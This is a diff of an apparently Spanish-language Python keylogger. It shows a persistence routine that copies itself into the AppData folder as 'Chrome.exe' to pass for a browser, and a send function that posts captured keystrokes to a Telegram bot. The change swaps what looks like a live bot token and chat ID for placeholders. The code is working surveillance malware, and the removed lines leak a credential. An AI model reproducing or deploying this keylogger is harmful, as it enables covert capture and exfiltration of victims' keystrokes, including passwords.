@@ -8,6 +8,7 @@ import sys
 import requests
 
 lista_tecla = []
+
 def persintencia():
     evil_file_location = os.environ["appdata"] + "\\Chrome.exe" 
     if not os.path.exists(evil_file_location):
@@ -23,8 +24,8 @@ def persintencia():
 
 def send(bot_message):
     
-    bot_token = '1417980393:AAFbbbSzn-PcvUF6aij3Q9yTBExyhjNX89Y'
-    bot_chatID = '1248561056'
+    bot_token = 'Tu Token de Telegram'
+    bot_chatID = 'Id del chat Bot'
     send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
     requests.get(send_text)
     lista_tecla.clear()
